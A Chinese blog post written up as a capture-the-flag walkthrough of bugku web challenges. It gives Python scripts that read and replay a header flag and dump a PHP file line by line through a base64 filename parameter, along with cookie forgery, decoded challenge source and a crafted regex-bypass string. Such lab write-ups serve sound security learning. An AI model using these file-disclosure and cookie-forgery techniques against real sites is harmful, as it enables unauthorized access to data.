<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>bugku刷题记录2 | 一路走到黑</title><meta name="keywords" content="脚本,php,cookie,编码"><meta name="author" content="sunzy"><meta name="copyright" content="sunzy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="bugku刷题记录2">
<meta property="og:type" content="article">
<meta property="og:title" content="bugku刷题记录2">
<meta property="og:url" content="https://sunzhengyu99.github.io/2020/09/10/bugku1/index.html">
<meta property="og:site_name" content="一路走到黑">
<meta property="og:description" content="bugku刷题记录2">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2020-09-10T01:05:12.000Z">
<meta property="article:modified_time" content="2020-12-28T03:18:33.009Z">
<meta property="article:author" content="sunzy">
<meta property="article:tag" content="脚本">
<meta property="article:tag" content="php">
<meta property="article:tag" content="cookie">
<meta property="article:tag" content="编码">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://sunzhengyu99.github.io/2020/09/10/bugku1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

const saveToLocal = {
  // ttl 單位是 天
  set: function setWithExpiry(key, value, ttl) {
    if (ttl === 0) return
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}

// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
const getScript = url => new Promise((resolve, reject) => {
  const script = document.createElement('script')
  script.src = url
  script.async = true
  script.onerror = reject
  script.onload = script.onreadystatechange = function() {
    const loadState = this.readyState
    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
    script.onload = script.onreadystatechange = null
    resolve()
  }
  document.head.appendChild(script)
})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2020-12-28 11:18:33'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">一路走到黑</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">bugku刷题记录2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-09-10T01:05:12.000Z" title="发表于 2020-09-10 09:05:12">2020-09-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-12-28T03:18:33.009Z" title="更新于 2020-12-28 11:18:33">2020-12-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="bugku刷题记录2"><a href="#bugku刷题记录2" class="headerlink" title="bugku刷题记录2"></a>bugku刷题记录2</h1><span id="more"></span>





<h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>打开页面查看源码什么也没有</p>
<p>抓包看了看，惊喜的发现了flag字段</p>
<p><img src="https://i.loli.net/2020/11/30/K7zFInPiQEkjvY6.png" alt></p>
<p>一段base64 解码后为<code>NDQyMDIy</code></p>
<p>提交发现并不对。。。看来另有玄机</p>
<p>多go几次后发现了flag值一直在变，并且有一段提示</p>
<p><code>&lt;!-- OK ,now you have to post the margin what you find --&gt;</code></p>
<p>用post方法提交你所发现的内容，只好使用脚本（不会写）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://120.24.86.145:8002/web6/&quot;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=r.get(url).headers<span class="comment">#因为flag在消息头里</span></span><br><span class="line"> </span><br><span class="line">mid=base64.b64decode(headers[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">mid=mid.decode()<span class="comment">#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的</span></span><br><span class="line"> </span><br><span class="line">flag = base64.b64decode(mid.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])<span class="comment">#获得flag:后的值</span></span><br><span class="line">data=&#123;<span class="string">&#x27;margin&#x27;</span>:flag&#125;</span><br><span class="line"><span class="built_in">print</span> (r.post(url,data).text)<span class="comment">#post方法传上去</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/11/30/7ydLFG96krwuQDn.png" alt="headers.png"></p>
<h2 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h2><p>注意观察url<code>http://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ=</code></p>
<p>line=2&amp;filename=a2V5cy50eHQ=</p>
<p><code>a2V5cy50eHQ=</code> 解密是为key.txt   line是行的意思，这里应该是查看key.txt的第line行的代码</p>
<p>这里可以查看<code>index.php</code>源码  index.php的base64值为<code>aW5kZXgucGhw</code></p>
<p><img src="https://i.loli.net/2020/11/30/k7VDufCye3x4WAE.png" alt="cookie1.png"></p>
<p>改变line的值可以一行一行的查看源码，可以使用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url1 = <span class="string">&quot;http://123.206.87.240:8002/web11/index.php?line=&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span></span><br><span class="line">mysession = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">40</span>):    </span><br><span class="line">    r = mysession.get(url1+<span class="built_in">str</span>(i)+url2)    </span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=base64_decode(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?intval(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) header(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;       <span class="comment">//看这里</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fa</span> = file(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><code>if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)</code></p>
<p> 这里可以判断cookie必须满足margin=margin才能访问keys.php</p>
<p><img src="https://i.loli.net/2020/11/30/5c9Ip8Rgn2xL4iS.png" alt="bp"></p>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>查看源码提示了</p>
<p><code>&lt;!--1p.html--&gt;</code>     </p>
<p>直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JTIyJT<span class="symbol">NCaWYlMjglMjElMjRfR0</span>VUJT<span class="attr">VCJTI3</span>aWQlMjcl<span class="symbol">NUQlMjklMEElN0</span>IlMEElMDloZWFkZXIlMjglMjdMb<span class="number">2</span><span class="symbol">NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4</span>aXQlMjglMjkl<span class="name">M0</span>IlMEEl<span class="symbol">N0</span>QlMEElMjRpZCUzRCUy<span class="symbol">NF9</span>HRVQl<span class="symbol">NUIlMjdpZCUyNyU1</span>RCUzQiUwQSUy<span class="symbol">NGElM0</span>QlMjRfR<span class="number">0</span>VUJT<span class="attr">VCJTI3</span>YSUy<span class="symbol">NyU1</span>RCUzQiUwQSUy<span class="symbol">NGIlM0</span>QlMjRfR<span class="number">0</span>VUJT<span class="attr">VCJTI3</span>YiUy<span class="symbol">NyU1</span>RCUzQiUwQWlmJTI<span class="number">4</span>c<span class="number">3</span>RyaXB<span class="attr">vcyUyOCUyNGElMkMlMjcuJTI3</span>JTI<span class="number">5</span>JTI<span class="number">5</span>JTBBJTdCJTBBJTA<span class="number">5</span>ZW<span class="symbol">NobyUyMCUyN25</span>vJTIwb<span class="name">m8</span>lMjBubyUyM<span class="name">G5</span>vJTIwb<span class="name">m8</span>lMjBubyUyM<span class="name">G5</span>vJTI<span class="number">3</span>JT<span class="symbol">NCJTBBJTA5</span>cmV<span class="number">0</span>dXJuJTIwJT<span class="symbol">NCJTBBJTdEJTBBJTI0</span>ZGF<span class="number">0</span>YSUyMCUzRCUyMEBmaWxlX<span class="number">2</span>dldF<span class="number">9</span>jb<span class="number">250</span>ZW<span class="number">50</span>cyUyOCUy<span class="symbol">NGElMkMlMjdyJTI3</span>JTI<span class="number">5</span>JT<span class="symbol">NCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3</span>UlMjBpcyUyMGElMjBuaW<span class="symbol">NlJTIwcGxhdGVmb3</span>JtJTIxJTIyJTIwYW<span class="number">5</span>kJTIwJTI<span class="number">0</span>aWQl<span class="name">M0</span>Ql<span class="name">M0</span>QwJTIwYW<span class="number">5</span>kJTIwc<span class="number">3</span>RybGVuJTI<span class="number">4</span>JTI<span class="number">0</span>YiUyOSUzRTUlMjBhbmQlMjBlcmV<span class="symbol">naSUyOCUyMjExMSUyMi5</span>zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE<span class="number">0</span>JTIyJTI<span class="number">5</span>JTIwYW<span class="number">5</span>kJTIwc<span class="number">3</span>Vic<span class="number">3</span>RyJTI<span class="number">4</span>JTI<span class="number">0</span>YiUyQzAlMkMxJTI<span class="number">5</span>JTIxJT<span class="symbol">NENCUyOSUwQSU3</span>QiUwQSUwOXJlcXVpcmUlMjglMjJm<span class="symbol">NGwyYTNnLnR4</span>dCUyMiUyOSUzQiUwQSU<span class="number">3</span>RCUwQW<span class="attr">Vsc2</span>UlMEEl<span class="symbol">N0</span>IlMEElMDlwcmludCUyMCUyM<span class="name">m5</span>ldmVyJTIwbmV<span class="number">2</span>ZXIlMjBuZXZlciUyMGdpdmUlMjB<span class="number">1</span>cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU<span class="number">3</span>RCUwQSUwQSUwQSUzRiUzRQ </span><br></pre></td></tr></table></figure>

<p>base64解码后为url编码</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">%22</span><span class="variable">%3</span>Bif<span class="variable">%28</span><span class="variable">%21</span><span class="variable">%24</span>_GET<span class="variable">%5</span>B<span class="variable">%27</span>id<span class="variable">%27</span><span class="variable">%5</span>D<span class="variable">%29</span><span class="variable">%0</span>A<span class="variable">%7</span>B<span class="variable">%0</span>A<span class="variable">%09</span>header<span class="variable">%28</span><span class="variable">%27</span>Location<span class="variable">%3</span>A<span class="variable">%20</span>hello.php<span class="variable">%3</span>Fid<span class="variable">%3</span>D<span class="number">1</span><span class="variable">%27</span><span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%0</span>A<span class="variable">%09</span>exit<span class="variable">%28</span><span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%0</span>A<span class="variable">%7</span>D<span class="variable">%0</span>A<span class="variable">%24</span>id<span class="variable">%3</span>D<span class="variable">%24</span>_GET<span class="variable">%5</span>B<span class="variable">%27</span>id<span class="variable">%27</span><span class="variable">%5</span>D<span class="variable">%3</span>B<span class="variable">%0</span>A<span class="variable">%24</span>a<span class="variable">%3</span>D<span class="variable">%24</span>_GET<span class="variable">%5</span>B<span class="variable">%27</span>a<span class="variable">%27</span><span class="variable">%5</span>D<span class="variable">%3</span>B<span class="variable">%0</span>A<span class="variable">%24</span>b<span class="variable">%3</span>D<span class="variable">%24</span>_GET<span class="variable">%5</span>B<span class="variable">%27</span>b<span class="variable">%27</span><span class="variable">%5</span>D<span class="variable">%3</span>B<span class="variable">%0</span>Aif<span class="variable">%28</span>stripos<span class="variable">%28</span><span class="variable">%24</span>a<span class="variable">%2</span>C<span class="variable">%27</span>.<span class="variable">%27</span><span class="variable">%29</span><span class="variable">%29</span><span class="variable">%0</span>A<span class="variable">%7</span>B<span class="variable">%0</span>A<span class="variable">%09</span>echo<span class="variable">%20</span><span class="variable">%27</span>no<span class="variable">%20</span>no<span class="variable">%20</span>no<span class="variable">%20</span>no<span class="variable">%20</span>no<span class="variable">%20</span>no<span class="variable">%20</span>no<span class="variable">%27</span><span class="variable">%3</span>B<span class="variable">%0</span>A<span class="variable">%09</span>return<span class="variable">%20</span><span class="variable">%3</span>B<span class="variable">%0</span>A<span class="variable">%7</span>D<span class="variable">%0</span>A<span class="variable">%24</span>data<span class="variable">%20</span><span class="variable">%3</span>D<span class="variable">%20</span><span class="title">@file_get_contents</span><span class="variable">%28</span><span class="variable">%24</span>a<span class="variable">%2</span>C<span class="variable">%27</span>r<span class="variable">%27</span><span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%0</span>Aif<span class="variable">%28</span><span class="variable">%24</span>data<span class="variable">%3</span>D<span class="variable">%3</span>D<span class="variable">%22</span>bugku<span class="variable">%20</span>is<span class="variable">%20</span>a<span class="variable">%20</span>nice<span class="variable">%20</span>plateform<span class="variable">%21</span><span class="variable">%22</span><span class="variable">%20</span><span class="keyword">and</span><span class="variable">%20</span><span class="variable">%24</span>id<span class="variable">%3</span>D<span class="variable">%3</span>D<span class="number">0</span><span class="variable">%20</span><span class="keyword">and</span><span class="variable">%20</span>strlen<span class="variable">%28</span><span class="variable">%24</span>b<span class="variable">%29</span><span class="variable">%3</span>E<span class="number">5</span><span class="variable">%20</span><span class="keyword">and</span><span class="variable">%20</span>eregi<span class="variable">%28</span><span class="variable">%22111</span><span class="variable">%22</span>.substr<span class="variable">%28</span><span class="variable">%24</span>b<span class="variable">%2</span>C<span class="number">0</span><span class="variable">%2</span>C<span class="number">1</span><span class="variable">%29</span><span class="variable">%2</span>C<span class="variable">%221114</span><span class="variable">%22</span><span class="variable">%29</span><span class="variable">%20</span><span class="keyword">and</span><span class="variable">%20</span>substr<span class="variable">%28</span><span class="variable">%24</span>b<span class="variable">%2</span>C<span class="number">0</span><span class="variable">%2</span>C<span class="number">1</span><span class="variable">%29</span><span class="variable">%21</span><span class="variable">%3</span>D<span class="number">4</span><span class="variable">%29</span><span class="variable">%0</span>A<span class="variable">%7</span>B<span class="variable">%0</span>A<span class="variable">%09</span>require<span class="variable">%28</span><span class="variable">%22</span>f<span class="number">4</span>l<span class="number">2</span>a<span class="number">3</span>g.txt<span class="variable">%22</span><span class="variable">%29</span><span class="variable">%3</span>B<span class="variable">%0</span>A<span class="variable">%7</span>D<span class="variable">%0</span>Aelse<span class="variable">%0</span>A<span class="variable">%7</span>B<span class="variable">%0</span>A<span class="variable">%09</span>print<span class="variable">%20</span><span class="variable">%22</span>never<span class="variable">%20</span>never<span class="variable">%20</span>never<span class="variable">%20</span>give<span class="variable">%20</span>up<span class="variable">%20</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%0</span>A<span class="variable">%7</span>D<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%3</span>F<span class="variable">%3</span>E</span><br></pre></td></tr></table></figure>

<p>url解码为源码</p>
<p><img src="https://i.loli.net/2020/11/30/qpmSYCjHZGeRD8F.png" alt></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">f(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @file_get_contents(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> strlen(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">&quot;111&quot;</span>.substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">&quot;f4l2a3g.txt&quot;</span>); <span class="comment">//注意这里，flag应该藏在这里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;never never never give up !!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>果然藏在f4l2a3g.txt</p>
<p><img src="https://i.loli.net/2020/11/30/ObAgHyeFnp9QM1G.png" alt></p>
<h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>此站没有flag，flag被人删了，不用再做了。–一个做题的路人</p>
<p>flag好像真的被删了，列不出来目录，查看wp也没有复现。</p>
<h2 id="正则？字符？"><a href="#正则？字符？" class="headerlink" title="正则？字符？"></a>正则？字符？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">&#x27;2.php&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;KEY&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$IM</span>= preg_match(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, trim(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )&#123; </span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p><code>preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</code></p>
<p>重点在这句话上，考点为正则表达式</p>
<blockquote>
<p><strong>定界符：</strong>/和/（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）；</p>
<p><strong>. （一个点）：</strong>表示可以匹配任何字符；</p>
<p><strong>*  ：</strong>前面的字符重复零次或多次；</p>
<p><strong>{n,m} ：</strong>前面的字符重复4~7次；</p>
<p><strong>\ （反斜线）：</strong>后面的字符被转义；</p>
<p><strong>[a-z] ：</strong>在a到z中匹配 ；</p>
<p><strong>[[:punct:]] ：</strong>匹配任何标点符号；</p>
<p><strong>/i ：</strong>表示这个正则表达式对大小写不敏感；</p>
</blockquote>
<p>因此可以写出符合要求的字符穿</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyakey22222key:<span class="regexp">/a/</span>aaakeyb!</span><br></pre></td></tr></table></figure>

